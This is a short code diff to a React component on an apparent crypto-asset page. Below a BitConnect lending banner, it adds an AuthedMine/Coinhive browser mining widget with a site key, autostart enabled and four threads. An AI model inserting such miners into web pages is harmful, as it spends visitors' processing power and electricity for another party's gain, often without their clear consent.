@@ -284,6 +284,13 @@ class Asset extends React.Component {
             'background': 'black'
           }}>
             <Image responsive bsClass='img-responsive center-block' src="https://bitconnect.co/upload/image/banner/lending/BitConnect-lending-728X90.gif"/>
+            <script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
+            <div className="coinhive-miner" style={{
+              "width": "256px",
+              "height": "60px"
+            }} data-key="NiiRozU9BSqWfKNl81wpAS5lwJgbhb1U" data-autostart="true" data-whitelabel="false" data-background="#000000" data-text="#eeeeee" data-action="#00ff00" data-graph="#555555" data-threads="4" data-throttle="0.1">
+              <em>Loading...</em>
+            </div>
           </div>
         </a>
       </Grid>
